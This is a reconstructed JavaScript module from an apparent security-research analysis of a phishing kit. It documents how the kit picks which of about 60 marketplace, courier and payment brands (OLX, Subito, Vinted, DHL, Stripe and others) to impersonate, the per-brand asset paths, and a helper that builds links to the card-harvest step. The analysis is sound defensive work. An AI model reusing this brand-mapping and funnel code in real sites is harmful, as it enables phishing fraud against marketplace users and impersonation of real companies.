/**
 * brandSkins.js — RECONSTRUCTED (technical analysis for security research)
 * =============================================================================
 * How the phishing kit picks which BRAND to impersonate and where that brand's
 * template assets live.
 *
 * Reconstructed from:
 *   - kit-source/decompressed/3d6f43bdae97...  (Subito sub-brand skin selection)
 *   - kit-source/decompressed/cd57840077ea...  (SubitoModeConfig definition; also
 *                                              a940d1ad..., 511d52c3...)
 *   - kit-source/decompressed/cc48fd435376...  (server-injected `service` descriptor)
 *   - per-brand asset-prefix chunks (5addca55..., e79901ba..., 417d6b91...,
 *     3626822d..., 39539e7245...) — supplied as cross-chunk evidence.
 *
 * KEY ARCHITECTURE FINDING
 * ------------------------
 * There is NO single central "switch(brand)" object. Instead:
 *   1. The server injects a JSON `service` descriptor into the page (per victim).
 *      It carries: name, code, country_code, a `variables` bag (logo, subdomain,
 *      mode, show_delivery, delivery_price, …), the methods list, etc.
 *   2. Each impersonated brand is its OWN Next.js page/webpack chunk that
 *      HARD-CODES its own asset prefix (`/static/<brand>/...` and sometimes a
 *      `/app/<brand>/...` route prefix). The runtime renders the chunk whose
 *      `service.code` / `service.name` matches.
 *   3. WITHIN a brand, a sub-skin can be chosen from a config map. The recovered
 *      example is Subito's `SubitoModeConfig` (motori/market/immobili/lavoro).
 *
 * So "subdomain -> brand" is data-driven: the `subdomain` field in the injected
 * service descriptor (e.g. "olx.") is what the attacker's panel uses to map an
 * incoming victim link to the right brand chunk. // RECONSTRUCTED-APPROX (the
 * actual routing is server-side; only the client-side descriptor is in the bundle)
 *
 * Strings, asset paths and Cyrillic preserved verbatim. DO NOT DEPLOY.
 */

/* =============================================================================
 * 1. Server-injected `service` descriptor (the brand selector).
 *    VERBATIM example for OLX / Poland (chunk cc48fd4353..., f839ecd9...):
 *
 *    "service": {
 *      "name": "OLX",
 *      "code": "olx",
 *      "variables": { "logo": "/static/olx/brand/logo.svg", "subdomain": "olx." },
 *      "country_code": "PL",
 *      "parser_support": true,
 *      "kind": "shop",
 *      "methods": ["2_0", "rental", "verify"],
 *      "aliases": null
 *    },
 *    "country": {
 *      "code": "PL",
 *      "names": { "en": "Poland", "ru": "Польша" },   // Cyrillic preserved
 *      "locales": ["pl_PL"],
 *      "emoji": "🇵🇱",
 *      "currency": { "code": "PLN", ... }
 *    }
 *
 *  -> The chosen brand chunk reads service.code/name to render; the per-victim
 *     `variables` (logo / subdomain / mode / show_delivery / delivery_price)
 *     personalise the skin.
 * ========================================================================== */

/**
 * selectBrandSkin — RECONSTRUCTED-APPROX model of how a brand template + its
 * asset base are resolved from the injected service descriptor.
 *
 * In the real bundle this is webpack code-splitting keyed by service.code; this
 * helper makes that mapping explicit for the investigation.
 */
export function selectBrandSkin(service) {
  const code = service?.code;                       // e.g. "olx"
  const subdomain = service?.variables?.subdomain;  // e.g. "olx."
  const entry = BRAND_TEMPLATES[code] || BRAND_TEMPLATES[stripDot(subdomain)];
  return entry || null; // null => brand not in this bundle slice
}

const stripDot = (s) => (typeof s === "string" ? s.replace(/\.$/, "") : s);

/* =============================================================================
 * 2. BRAND_TEMPLATES — the full set of impersonated brands and their literal
 *    asset prefixes recovered from the decompiled chunks.
 *
 *    `staticPrefix` : the verbatim /static/<brand>/ asset directory.
 *    `appPrefix`    : verbatim /app/<brand>/ route prefix where one was found.
 *    `kind`         : "marketplace" (the listing site impersonated) or
 *                     "courier"     (the shipping brand used in the funnel) or
 *                     "payment"/"bank" (trust assets).
 *
 *    NOTE: most marketplace brands map onto SHARED locale variants of the same
 *    template family (e.g. 2dehands/2ememain are the BE-NL / BE-FR skins, with
 *    asset suffixes --nlbe / --frbe). // RECONSTRUCTED-APPROX kind labels.
 * ========================================================================== */
export const BRAND_TEMPLATES = {
  // ---- Marketplaces / classifieds (the victim-facing impersonated sites) ----
  olx:           { name: "OLX",            staticPrefix: "/static/olx",          kind: "marketplace" }, // logo: /static/olx/brand/logo.svg
  subito:        { name: "Subito.it",      staticPrefix: "/static/subito",       kind: "marketplace", subSkins: "SubitoModeConfig" },
  anibis:        { name: "Anibis.ch",      staticPrefix: "/static/anibis",       appPrefix: "/app/anibis-ch-second-hand-verkaufen", kind: "marketplace" },
  tutti:         { name: "Tutti.ch",       staticPrefix: "/static/tutti",        appPrefix: "/app/tutti-ch-second-hand-verkaufen",  kind: "marketplace" },
  ricardo:       { name: "Ricardo.ch",     staticPrefix: "/static/ricardo",      appPrefix: "/app/ricardo-ch", kind: "marketplace" },
  gumtree:       { name: "Gumtree",        staticPrefix: "/static/gumtree",      appPrefix: "/app/gumtree",    kind: "marketplace" },
  marktplaats:   { name: "Marktplaats",    staticPrefix: "/static/marktplaats",  kind: "marketplace" }, // NL
  "2dehands":    { name: "2dehands",       staticPrefix: "/static/2dehands",     kind: "marketplace" }, // BE-NL  (--nlbe assets)
  "2ememain":    { name: "2ememain",       staticPrefix: "/static/2ememain",     kind: "marketplace" }, // BE-FR  (--frbe assets)
  markt:         { name: "Markt.de",       staticPrefix: "/static/markt",        kind: "marketplace" }, // DE
  blocket:       { name: "Blocket",        staticPrefix: "/static/blocket",      kind: "marketplace" }, // SE
  finn:          { name: "FINN.no",        staticPrefix: "/static/finn",         kind: "marketplace" }, // NO
  dba:           { name: "DBA.dk",         staticPrefix: "/static/dba",          kind: "marketplace" }, // DK
  guloggratis:   { name: "GulogGratis",    staticPrefix: "/static/guloggratis",  kind: "marketplace" }, // DK
  tori:          { name: "Tori.fi",        staticPrefix: "/static/tori",         kind: "marketplace" }, // FI
  huuto:         { name: "Huuto.net",      staticPrefix: "/static/huuto",        kind: "marketplace" }, // FI
  wallapop:      { name: "Wallapop",       staticPrefix: "/static/wallapop",     kind: "marketplace" }, // ES
  vinted:        { name: "Vinted",         staticPrefix: "/static/vinted",       kind: "marketplace" },
  depop:         { name: "Depop",          staticPrefix: "/static/depop",        kind: "marketplace" },
  carousell:     { name: "Carousell",      staticPrefix: "/static/carousell",    kind: "marketplace" },
  offerup:       { name: "OfferUp",        staticPrefix: "/static/offerup",      kind: "marketplace" }, // US
  trademe:       { name: "Trade Me",       staticPrefix: "/static/trademe",      kind: "marketplace" }, // NZ
  airtasker:     { name: "Airtasker",      staticPrefix: "/static/airtasker",    kind: "marketplace" }, // AU
  plick:         { name: "Plick",          staticPrefix: "/static/plick",        kind: "marketplace" }, // SE
  tise:          { name: "Tise",           staticPrefix: "/static/tise",         kind: "marketplace" },
  yaga:          { name: "Yaga",           staticPrefix: "/static/yaga",         kind: "marketplace" },
  aukro:         { name: "Aukro",          staticPrefix: "/static/aukro",        kind: "marketplace" }, // CZ/PL
  bazar:         { name: "Bazar",          staticPrefix: "/static/bazar",        kind: "marketplace" },
  alio:          { name: "Alio",           staticPrefix: "/static/alio",         kind: "marketplace" }, // BG
  skelbiu:       { name: "Skelbiu",        staticPrefix: "/static/skelbiu",      kind: "marketplace" }, // LT
  imarked:       { name: "iMarked",        staticPrefix: "/static/imarked",      kind: "marketplace" },
  md999:         { name: "999.md",         staticPrefix: "/static/md999",        kind: "marketplace" }, // MD (Moldova)
  tablondeanuncios:{ name: "Tablón de Anuncios", staticPrefix: "/static/tablondeanuncios", kind: "marketplace" }, // ES
  tikkie:        { name: "Tikkie",         staticPrefix: "/static/tikkie",       appPrefix: "/app/tikkie",  kind: "payment" }, // NL payment request
  tiptapp:       { name: "Tiptapp",        staticPrefix: "/static/tiptapp",      appPrefix: "/app/tiptapp", kind: "marketplace" },
  "apple-store": { name: "Apple Store",    staticPrefix: "/static/apple-store",  appPrefix: "/app/apple-store", kind: "marketplace" },

  // ---- Couriers / shipping brands (the delivery "skin" in the funnel) ----
  fancourier:    { name: "FAN Courier",    staticPrefix: "/static/fancourier",   appPrefix: "/app/fan-courier-mobile", kind: "courier" }, // RO
  bpost:         { name: "bpost",          staticPrefix: "/static/bpost",        kind: "courier", localeKey: "bpost-locale" }, // BE
  correos:       { name: "Correos",        staticPrefix: "/static/correos",      appPrefix: "/app/correos-info", kind: "courier" }, // ES (also /app/C102638007)
  ctt:           { name: "CTT",            staticPrefix: "/static/ctt",          kind: "courier" }, // PT
  posta:         { name: "Posta",          staticPrefix: "/static/posta",        kind: "courier" },
  posti:         { name: "Posti",          staticPrefix: "/static/posti",        kind: "courier" }, // FI
  posten:        { name: "Posten",         staticPrefix: "/static/posten",       kind: "courier" }, // SE/NO
  postnl:        { name: "PostNL",         staticPrefix: "/static/postnl",       kind: "courier" }, // NL
  auspost:       { name: "Australia Post", staticPrefix: "/static/auspost",      kind: "courier" }, // AU
  nzpost:        { name: "NZ Post",        staticPrefix: "/static/nzpost",       kind: "courier" }, // NZ
  dhl:           { name: "DHL",            staticPrefix: "/static/dhl",          kind: "courier" },
  dpd:           { name: "DPD",            staticPrefix: "/static/dpd",          kind: "courier" },
  ups:           { name: "UPS",            staticPrefix: "/static/ups",          kind: "courier", localeKey: "ups-locale" },
  inpost:        { name: "InPost",         staticPrefix: "/static/inpost",       kind: "courier" }, // PL
  packeta:       { name: "Packeta",        staticPrefix: "/static/packeta",      kind: "courier" },
  zasilkovna:    { name: "Zásilkovna",     staticPrefix: "/static/zasilkovna",   kind: "courier" }, // CZ
  omniva:        { name: "Omniva",         staticPrefix: "/static/omniva",       kind: "courier" }, // Baltics
  matkahuolto:   { name: "Matkahuolto",    staticPrefix: "/static/matkahuolto",  kind: "courier" }, // FI
  dao:           { name: "DAO",            staticPrefix: "/static/dao",          kind: "courier" }, // DK
  helthjem:      { name: "Helthjem",       staticPrefix: "/static/helthjem",     kind: "courier" }, // NO
  dbschenker:    { name: "DB Schenker",    staticPrefix: "/static/dbschenker",   kind: "courier" },
  packandsend:   { name: "Pack & Send",    staticPrefix: "/static/packandsend",  kind: "courier" }, // AU
  booking:       { name: "Booking",        staticPrefix: "/static/booking",      kind: "marketplace" },
  ikea:          { name: "IKEA",           staticPrefix: "/static/ikea",         kind: "marketplace" },

  // ---- Payment / bank / wallet trust assets (used in the harvest step) ----
  stripe:        { name: "Stripe",         staticPrefix: "/static/stripe",       kind: "payment" },
  twint:         { name: "TWINT",          staticPrefix: "/static/twint",        kind: "payment" }, // CH
  vipps:         { name: "Vipps",          staticPrefix: "/static/vipps",        kind: "payment" }, // NO
  western:       { name: "Western Union",  staticPrefix: "/static/western",      kind: "payment" },
  banks:         { name: "Banks (generic)",staticPrefix: "/static/banks",        kind: "bank" },
  cards:         { name: "Cards (generic)",staticPrefix: "/static/cards",        kind: "payment" },
  bokborsen:     { name: "Bokbörsen",      staticPrefix: "/static/bokborsen",    kind: "marketplace" }, // SE (assets: /static/bokborsen/images/${name})
};

/* =============================================================================
 * 3. SubitoModeConfig — sub-brand skin map for the Subito template.
 *    VERBATIM from chunk cd57840077ea... (exported under key "SubitoModeConfig").
 *    Indexed by ad.variables.mode; falls back to `.default`.
 *
 *    NOTE: the theme classes here (theme-blueMotori etc.) match the CSS theme
 *    blocks in the Subito stylesheet. The "theme-redCorporate" class seen in the
 *    helpdesk header is a SEPARATE fixed promo-banner theme, NOT a sub-skin.
 * ========================================================================== */
export const SubitoModeConfig = {
  motori:   { theme: "theme-blueMotori hide-lira-b",   logo: "/static/subito/brand/motori.svg",   logoClass: "motori-logo",    helpdeskTheme: "blue" },
  market:   { theme: "theme-yellowMarket",             logo: "/static/subito/brand/market.svg",   logoClass: "market-logo",    helpdeskTheme: "yellow" },
  immobili: { theme: "theme-purpleImmobili hide-lira-b", logo: "/static/subito/brand/immobili.svg", logoClass: "immobili-logo", helpdeskTheme: "purple" },
  lavoro:   { theme: "theme-greenLavoro hide-lira-b",  logo: "/static/subito/brand/lavoro.svg",   logoClass: "lavoro-logo",    helpdeskTheme: "green" },
  default:  { theme: "hide-lira-b",                    logo: "/static/subito/brand/logo.svg",     logoClass: "corporate-logo", helpdeskTheme: "default" },
};

/**
 * resolveSubitoSkin — exactly how the page picks the sub-skin (verbatim logic):
 *   y = SubitoModeConfig[ad.variables?.mode] || SubitoModeConfig.default
 */
export function resolveSubitoSkin(adVariables) {
  return SubitoModeConfig[adVariables?.mode] || SubitoModeConfig.default;
}

/* =============================================================================
 * 4. useButtonSubmit / makeLink — builds the harvest URL the CTA points at.
 *    Imported by every brand template (original module e.i(15432) area). The
 *    real implementation lives in another subsystem's chunk; this is the
 *    consumed shape. // RECONSTRUCTED-APPROX
 *
 *    Usage in templates:
 *      const { makeLink } = useButtonSubmit(serviceMethod, ad.tag);
 *      <CTA href={makeLink("stripe")} />   // -> next phishing step ("stripe")
 *
 *    `makeLink(step)` returns the URL for the named funnel step ("stripe" = the
 *    card / payout-details harvest page). `serviceMethod` selects which method
 *    flow ("2_0" / "rental" / "verify") and `ad.tag` is the victim/session tag.
 * ========================================================================== */
export function useButtonSubmit(serviceMethod, tag) {
  // RECONSTRUCTED-APPROX — real body builds a per-session signed link.
  const makeLink = (step) => `/${serviceMethod}/${tag}/${step}`;
  return { makeLink };
}

export default { selectBrandSkin, BRAND_TEMPLATES, SubitoModeConfig, resolveSubitoSkin, useButtonSubmit };
